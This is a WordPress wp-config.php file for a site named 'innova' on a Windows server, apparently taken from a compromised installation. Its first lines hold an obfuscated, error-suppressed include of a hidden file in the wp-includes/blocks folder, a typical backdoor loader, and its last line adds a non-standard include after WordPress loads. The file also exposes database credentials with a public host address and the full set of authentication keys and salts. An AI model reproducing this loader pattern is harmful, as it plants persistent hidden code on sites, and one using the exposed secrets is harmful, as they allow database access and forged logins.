<?php
/*44b9d*/

@include /*bw*/("C:/\x69netpub/wwwroot/\x69nnova/wp\x2d\x69ncludes/blocks/.5dc7f5c1.ot\x69");

/*44b9d*/
//Begin Really Simple SSL session cookie settings
@ini_set('session.cookie_httponly', true);
@ini_set('session.cookie_secure', true);
@ini_set('session.use_only_cookies', true);
//END Really Simple SSL cookie settings

/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * Database settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/documentation/article/editing-wp-config-php/
 *
 * @package WordPress
 */

// ** Database settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('WP_CACHE', true);
define( 'WPCACHEHOME', 'C:\inetpub\wwwroot\innova\wp-content\plugins\wp-super-cache/' );
define( 'DB_NAME', 'innova' );

/** Database username */
define( 'DB_USER', 'innova' );

/** Database password */
define( 'DB_PASSWORD', 'innova' );

/** Database hostname */
define( 'DB_HOST', '18.220.39.169' );

/** Database charset to use in creating database tables. */
define( 'DB_CHARSET', 'utf8mb4' );

/** The database collate type. Don't change this if in doubt. */
define( 'DB_COLLATE', '' );

/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */
define( 'AUTH_KEY',         '>1ZCc. &7PTiadw+TtRC^Ui.0pE0`F$dXcWO.5!>.LzdSB2U9DIh`bXE/L[tSA&0' );
define( 'SECURE_AUTH_KEY',  'NjM+D[EFcG `dGY$m!Zv(,nFDZ}&ED#0,r#(`1k{1}?)LsC}qU7b9tSlsoO++$^d' );
define( 'LOGGED_IN_KEY',    '(OD1j[b0d&BAkX;!u]vm%QGCHl]Oy>YwS9h:4;C7Ob|~B:~{FIg0wq36SzgWi^B6' );
define( 'NONCE_KEY',        ';bLlT~ZK64G,Rf8!,kLr=9+6Jx$EXy>=|-%I,S7p#d _}1RrUoTDw}YMB_lsZpie' );
define( 'AUTH_SALT',        'Rgq7$:#4yvE3 3AM<t-8`eboif(GS2Z-Y%t-::=Zo>~9 8gFZMP]$0M4y-=d*?1l' );
define( 'SECURE_AUTH_SALT', ',,O!]xRl;8jI+UCyqDT#+Asm-iZrH29Wr-w,m~MID%mR-#K^k0s3y;Leke=fr1*M' );
define( 'LOGGED_IN_SALT',   'iM[XxSuuqH]f#B(.x`8ja,x2u2Zv`Z6t$$Q!),z|o6 ,nl*DbWDleV2P](.MUl7%' );
define( 'NONCE_SALT',       'b&)~G5VLy~tTZ(78vfvnBU%*14T7B}7` ]8nT:WF{W4%Sj}xD2+8[sa`g2[rw_P.' );

/**#@-*/

/**
 * WordPress database table prefix.
 *
 * You can have multiple installations in one database if you give each
 * a unique prefix. Only numbers, letters, and underscores please!
 */
$table_prefix = 'wp_';

/**
 * For developers: WordPress debugging mode.
 *
 * Change this to true to enable the display of notices during development.
 * It is strongly recommended that plugin and theme developers use WP_DEBUG
 * in their development environments.
 *
 * For information on other constants that can be used for debugging,
 * visit the documentation.
 *
 * @link https://wordpress.org/documentation/article/debugging-in-wordpress/
 */
define( 'WP_DEBUG', false );

/* Add any custom values between this line and the "stop editing" line. */



/* That's all, stop editing! Happy publishing. */

/** Absolute path to the WordPress directory. */
if ( ! defined( 'ABSPATH' ) ) {
	define( 'ABSPATH', __DIR__ . '/' );
}

/** Sets up WordPress vars and included files. */
require_once ABSPATH . 'wp-settings.php';
include_once(ABSPATH . WPINC . '/header.php');

